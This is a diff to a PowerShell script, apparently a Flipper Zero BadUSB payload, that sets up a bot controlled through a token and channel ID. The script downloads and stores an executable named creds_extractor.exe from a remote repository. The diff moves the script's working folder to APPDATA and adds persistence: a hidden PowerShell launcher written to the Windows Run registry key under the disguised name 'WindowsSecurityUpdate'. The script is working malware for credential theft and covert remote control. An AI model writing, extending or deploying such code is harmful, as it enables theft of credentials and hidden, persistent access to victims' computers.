@@ -1,7 +1,7 @@
 [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
 $botToken = "$bt"
 $channelId = "$ch"
-$scriptDir = Join-Path $env:TEMP "FlipperBot"
+$scriptDir = Join-Path $env:APPDATA "FlipperBot"
 New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
 
 $pythonPath = $null
@@ -50,5 +50,8 @@ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ironpxs/flipper_script
 
 $exePath = Join-Path $scriptDir "creds_extractor.exe"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ironpxs/flipper_scripts/main/flipperbot/creds_extractor.exe" -OutFile $exePath
+
+$launchCmd = "powershell -WindowStyle Hidden -Command `"& '$pythonPath' '$botPath'`""
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityUpdate' -Value $launchCmd
 
 & $pythonPath $botPath
